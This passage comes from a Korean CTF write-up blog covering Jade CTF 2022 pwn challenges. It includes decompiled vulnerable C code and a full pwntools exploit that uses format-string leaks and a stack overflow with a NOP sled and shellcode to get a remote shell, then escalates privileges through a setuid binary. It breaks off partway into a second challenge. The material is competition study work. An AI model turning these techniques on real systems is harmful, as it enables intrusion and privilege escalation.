fsb</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !another_chance )                      <span class="comment">// if another_chance = 1 ?</span></span><br><span class="line">      <span class="keyword">break</span>;                                    <span class="comment">// pass</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You get one more chance to enter the coupon!&quot;</span>);</span><br><span class="line">    another_chance = <span class="number">0</span>;                         <span class="comment">// if another_chance == 1, </span></span><br><span class="line">                                                <span class="comment">// It can make another_chance = 0.</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No more chances left!&quot;</span>);</span><br><span class="line">LABEL_7:</span><br><span class="line">  <span class="keyword">if</span> ( successfull != <span class="number">1</span> )                       <span class="comment">// if (input != coupon_code), I can&#x27;t do ROP.</span></span><br><span class="line">                                                <span class="comment">// =&gt; should (input == coupon_code)</span></span><br><span class="line">    choose_option();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>해당 함수를 열어보면 bof와 fsb 취약점이 하나씩 눈에 보인다. </p><p>1번 메뉴 <code>roll_the_dice()</code> 함수에서 봤던 another_chance 전역 변수에 주목해보자. </p><p>bof가 먼저 터지고 fsb가 그 다음 터진다. 그리고 another_chance 전역 변수를 사용한다. 얘가 1이면 break가 되지 않고 while을 한 번 더 돌 수 있게 된다. 그리고 해당 전역 변수를 0으로 set한다. </p><p>이 말은 뭐다? 루프를 두 번 돌 수 있다. 즉, bof와 fsb를 한 번 더 활용할 수 있다는 뜻.</p><p>그리고 프로그램 흐름을 바꾸기 위해서 ret를 바꿔줘야하는데, 이를 위해선 함수 return을 해야한다. 코드를 보면 coupon_code를 틀리면 successfull 전역 변수가 0으로 유지되어 함수가 종료되기 전에 <code>choose_option()</code> 함수를 실행하게 된다. 그러면 안되기 때문에 coupon_code를 맞춰주어서 successfull을 1로 set해줘야한다.</p><p>마침 스택에 우리의 input 다음에 coupon_code가 위치하고 있기 때문에 굳이 input에 “YCHHZZHHMSHWI”을 적지 않아도 우회할 수 있다.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><p>취약점은 위에서 봤듯 <code>enter_coupon()</code> 함수에서 bof와 fsb가 발생한다. canary와 pie가 걸려있기 때문에 fsb로 이것을 릭해야하는 필요성을 느낀다. </p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>우리는 bof와 fsb가 순차적으로 두 번씩 터진다. 생각해보면, pie를 굳이 릭할 필요가 없다. 왜냐하면 NX bit disabled이기 때문에 우리는 스택에서 쉘코드를 실행시킬 수 있다.</p><p>stack 주소를 릭해서 우리의 input buf와 얼마나 떨어져있는지 offset을 구할 수 있기 때문에 return 주소를 거기로 돌려줄 수 있다.</p><p>이때 익스 확률을 높이기 위해 NOP Sled를 해줬다. 이 때 페이로드 구성은 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`\x00`  * (0xd0-0x62) + NOP sled + shellcode + canary + sfp + ret(input buf)</span><br></pre></td></tr></table></figure><p>input 크기와 coupon_code 크기를 합친 만큼 <code>\x00</code>을 넣어주었다. 하드코딩된 coupon_code을 맞춰서 적지 않아줘도 strcmp를 손쉽게 우회할 수 있다.</p><p>그럼 쉘코드 실행이 성공하게 되고 쉘을 획득할 수 있다. 코드 설명할 떄 언급했듯이 플래그의 위치는 정 다른 곳에 위치하고 있다. <code>ls -al *</code>을 이용해서 진짜 플래그처럼 보이는 것을 찾아보았다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">opt:</span><br><span class="line">total 28</span><br><span class="line">drwxr-x--- 1 0 1000  4096 Oct 22 03:03 .</span><br><span class="line">drwxr-x--- 1 0 1000  4096 Oct 22 04:05 ..</span><br><span class="line">-rwxr----- 1 0 1001    36 Oct 21 05:21 real_flag.txt</span><br><span class="line">-rwsr-sr-x 1 0 1001 13440 Oct 22 03:03 worker</span><br></pre></td></tr></table></figure><p>진짜 플래그는 <code>/opt/real_flag.txt</code>에 위치하고 있다. 문제는 권한이 없어서 플래그를 읽을 수가 없다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /opt/real_flag.txt</span><br><span class="line">cat: /opt/real_flag.txt: Permission denied</span><br></pre></td></tr></table></figure><p>그래서 아래 setuid가 걸린 worker 파일을 이용해서 파일을 실행시킴으로써 권한상승을 해준 뒤에 그 권한으로 read_flag.txt를 읽어줘야 한다.</p><p>한 마디로 worker 바이너리를 익스해야 한다. 이것을 위해서 리모트의 worker 바이너리를 로컬로 복사하는 작업이 필요한데, 나는 base64를 이용해서 바이너리를 복사해주었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -w0 /opt/worker </span><br></pre></td></tr></table></figure><p>로컬에서 파일 하나 만들어서 base64한 것을 붙인 다음 디코딩을 하면 된다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi aa</span><br><span class="line">base64 -d aa &gt; worker</span><br><span class="line">chmod +x worker</span><br></pre></td></tr></table></figure><p>이 worker 바이너리를 익스하게 되면 worker 권한으로 권한 상승이 되었기 때문에 최종적으로 real_flag.txt를 읽을 수 있다. worker 바이너리 익스는 간단하기 때문에 따로 언급하지 않겠다.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><h4 id="Part-1"><a href="#Part-1" class="headerlink" title="Part 1"></a>Part 1</h4><ol><li>case 5 실행할 때까지 1번 메뉴 실행</li><li>2번 메뉴에서 canary 및 stack 주소 릭한 후, input buf 주소 계산 (첫 번째 루프)</li><li>payload 구성 (두 번째 루프)<ul><li><code>\x00</code>… + NOP sled + shellcode + canary + sfp + ret(input buf) # <code>\x00</code>으로 strcmp 검사 통과</li></ul></li></ol><h4 id="Part-2"><a href="#Part-2" class="headerlink" title="Part 2"></a>Part 2</h4><ol start="4"><li>리모트 쉘을 딴 후 &#x2F;opt&#x2F;worker 익스 진행</li><li>권한 상승 후 real_flag.txt 읽기</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = e.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enter</span>(<span class="params">inp</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;code:&#x27;</span>, inp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">roll</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recvline()</span><br><span class="line">            want = p.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;You get another&#x27;</span> <span class="keyword">in</span> want:</span><br><span class="line">                <span class="built_in">print</span>(want)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">roll()</span><br><span class="line"></span><br><span class="line"><span class="comment">## canary 33</span></span><br><span class="line"></span><br><span class="line">enter(<span class="string">&#x27;%33$p %34$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;d: &#x27;</span>)</span><br><span class="line">leak = p.recvline().decode()</span><br><span class="line">canary = <span class="built_in">int</span>(leak.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(leak.split(<span class="string">&#x27; &#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#canary = int(p.recvline()[2:], 16)</span></span><br><span class="line">info(<span class="string">&#x27;canary :: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line">buf = stack_leak - <span class="number">0x80</span></span><br><span class="line">info(<span class="string">&#x27;buf :: &#x27;</span> + <span class="built_in">hex</span>(buf))</span><br><span class="line"></span><br><span class="line">sh = asm(<span class="string">&#x27;sub rsp, 0x1000\n&#x27;</span>+shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(sh)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xd0</span>-<span class="number">0x62</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xd0</span>-<span class="number">0x8</span>-<span class="built_in">len</span>(sh), <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += sh</span><br><span class="line">payload += p64(canary)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(buf)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;code:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># PART 2 ##################################################</span></span><br><span class="line">p.sendline(<span class="string">&#x27;./opt/worker&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x40090c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x50</span>+<span class="number">0x8</span>) </span><br><span class="line">payload += p64(win)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;number:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="shellcode를-아래처럼-구성해준-이유"><a href="#shellcode를-아래처럼-구성해준-이유" class="headerlink" title="shellcode를 아래처럼 구성해준 이유"></a>shellcode를 아래처럼 구성해준 이유</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh = asm(<span class="string">&#x27;sub rsp, 0x1000\n&#x27;</span>+shellcraft.sh())</span><br></pre></td></tr></table></figure><p><code>shellcraft.sh()</code>만하면 안되나? 왜 <code>sub rsp, 0x1000</code>을 추가했을까? </p><p>없는 경우 스택을 살펴보자.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────── registers ────</span><br><span class="line"></span><br><span class="line">$rsp   : 0x007ffd7b94f028  →  0x0000000000000008</span><br><span class="line">$rip   : 0x007ffd7b94f029  →  0x0000000000000000</span><br><span class="line">────────────────────────────────────────────────────────── stack ────</span><br><span class="line">   0x7ffd7b94f024                  xor    esi, esi</span><br><span class="line">   0x7ffd7b94f026                  push   rsi</span><br><span class="line">   0x7ffd7b94f027                  push   0x8</span><br><span class="line"> → 0x7ffd7b94f029                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02b                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02d                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02f                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f031                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f033                  add    BYTE PTR [rax], al</span><br></pre></td></tr></table></figure><p>.. 쉘코드를 실행하다가 멈췄다. 쉘코드가 저장된 곳에 값을 쓰고 있어서 한마디로 실행할 코드가 저장된 곳이 스택인데 그 스택에 이것저것 쓰면서 사용하고 있기 때문에 실행할 코드가 더럽혀졌다.</p><p>그래서 <code>sub rsp, 0x1000</code>을 추가해서 사용하는 스택이랑 쉘코드가 저장되는 스택이랑 다르게 위치시켜주었다.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;d1d_y0u_l1k3_th3_du4l_pwn?&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>대회 끝나고 풀었다. 이 바이너리에서 취약점은 비교적 찾기 쉽지만.. flag를 얻기 위한 과정이 순탄치 않았다……….. 새롭게 알게된 것이 있다. base64를 이용해서 리모트 파일을 복사해온다는 정도? </p><p>그리고 원래 알고 있었지만 문제 풀 때 리마인드 된 것들.<br>예를 들면 return address를 건들기 위해서는 함수 return을 해줘야 한다거나, NX bit가 해제되어 있으면 스택에서 Shellcode를 실행시킬 수 있고, 이때 익스 확률을 높이기 위해서 NOP Sled를 할 수 있다는 것 정도?</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jade </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> NOP Sled </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Data Storage (canary, pie)</title>
      <link href="/221026-jadectf2022-data_storage/"/>
      <url>/221026-jadectf2022-data_storage/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(32&#x2F;630) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>In his DBMS course, Shekhar was learning about CRUD operations. He was taught these operations in SQL, but he wanted to try them out in C. He wrote a program for reading data from input, and then scrambling it so other users can’t figure out what is stored. He gave me the binary to test it, could you help me out?</p><p>nc 34.76.206.46 10003</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── chall</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>카나리가 있고 PIE도 있다.. </p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>코드는 간단하다. main()에서 database_store()를 호출하는데 이 함수에 취약한 부분이 존재한다. 그래서 이 함수 하나만 보면 된다.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">database_store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> yes[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">520</span>]; <span class="comment">// [rsp+30h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+238h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you sure that you want to store data [yes/no]?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You entered: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);                                    <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIs that correct?&quot;</span>);</span><br><span class="line">  fgets(yes, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  yes[<span class="built_in">strcspn</span>(yes, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(yes, <span class="string">&quot;yes&quot;</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, it&#x27;s time to enter your details&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Note that there is a length given for each field, you have to enter atleast that many characters&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Fill it up with spaces if your input is less&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Enter your Name(%d), Admission Number(%d), Branch(%d), University(%d), and Address(%d) (in this order):\n&quot;</span>,</span><br><span class="line">    n,</span><br><span class="line">    an,</span><br><span class="line">    b,</span><br><span class="line">    u,</span><br><span class="line">    a[<span class="number">0</span>]);</span><br><span class="line">  gets(input);                                  <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Scrambling your data so that hackers can&#x27;t steal it...&quot;</span>);</span><br><span class="line">  modify(&amp;name, input, <span class="number">0LL</span>, n);</span><br><span class="line">  v1 = n;</span><br><span class="line">  modify(&amp;admno, input, n, an);</span><br><span class="line">  v2 = an + v1;</span><br><span class="line">  modify(&amp;branch, input, v2, b);</span><br><span class="line">  v3 = b + v2;</span><br><span class="line">  modify(&amp;university, input, v3, u);</span><br><span class="line">  modify(&amp;address, input, u + v3, a[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  modify(input, &amp;name, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)n / <span class="number">2</span>));</span><br><span class="line">  v4 = (<span class="type">int</span>)n / <span class="number">2</span>;</span><br><span class="line">  modify(&amp;input[(<span class="type">int</span>)n / <span class="number">2</span>], &amp;branch, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)b / <span class="number">3</span>));</span><br><span class="line">  v5 = (<span class="type">int</span>)b / <span class="number">3</span> + v4;</span><br><span class="line">  modify(&amp;input[v5], &amp;admno, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)an / <span class="number">3</span>));</span><br><span class="line">  v6 = (<span class="type">int</span>)an / <span class="number">3</span> + v5;</span><br><span class="line">  modify(&amp;input[v6], &amp;university, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span>));</span><br><span class="line">  v7 = (<span class="type">int</span>)u / <span class="number">2</span> + v6;</span><br><span class="line">  modify(&amp;input[v7], &amp;address, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>));</span><br><span class="line">  v8 = a[<span class="number">0</span>] / <span class="number">10</span> + v7;</span><br><span class="line">  modify(&amp;input[v8], &amp;branch, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)b / <span class="number">3</span>), b - (<span class="type">int</span>)b / <span class="number">3</span>);</span><br><span class="line">  v9 = b - (<span class="type">int</span>)b / <span class="number">3</span> + v8;</span><br><span class="line">  modify(&amp;input[v9], &amp;name, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)n / <span class="number">2</span>), n - (<span class="type">int</span>)n / <span class="number">2</span>);</span><br><span class="line">  v10 = n - (<span class="type">int</span>)n / <span class="number">2</span> + v9;</span><br><span class="line">  modify(&amp;input[v10], &amp;address, (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>), (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>));</span><br><span class="line">  v11 = a[<span class="number">0</span>] / <span class="number">10</span> + v10;</span><br><span class="line">  modify(&amp;input[v11], &amp;university, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span>), (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">4</span>));</span><br><span class="line">  v12 = (<span class="type">int</span>)u / <span class="number">4</span> + v11;</span><br><span class="line">  modify(&amp;input[v12], &amp;admno, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)an / <span class="number">3</span>), an - (<span class="type">int</span>)an / <span class="number">3</span>);</span><br><span class="line">  v13 = an - (<span class="type">int</span>)an / <span class="number">3</span> + v12;</span><br><span class="line">  modify(&amp;input[v13], &amp;address, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>)), (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] - <span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>)));</span><br><span class="line">  modify(</span><br><span class="line">    &amp;input[a[<span class="number">0</span>] - <span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>) + v13],</span><br><span class="line">    &amp;university,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span> + (<span class="type">int</span>)u / <span class="number">4</span>),</span><br><span class="line">    u - ((<span class="type">int</span>)u / <span class="number">2</span> + (<span class="type">int</span>)u / <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>코드가 복잡해보이지만(?) 기능 분석을 할 필요는 없다. 취약점을 찾는 것이 목표이기 때문에 필요한 부분만 읽으면 된다.</p><p>그러면 fsb와 bof가 대놓고 보이는 것을 찾을 수 있다.</p><p>fsb로 필요한 것을 leak하고 bof를 이용해서 ROP를 하면 된다. 말은 이렇게 간단하지만 익스하는데 꽤나 오래걸렸고 생각보다 스트레스를 받았었다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>local 기준으로 익스를 작성했는데 remote는 잘 되지 않는 문제(?)가 발생했다. (로되리안 ㅜ)</p><p>local과 remote의 libc가 달라서 스택에 값이 쌓이는게 달라졌다. 그래서 leak할 offset을 루프를 돌려서 찾는 과정이 추가적으로 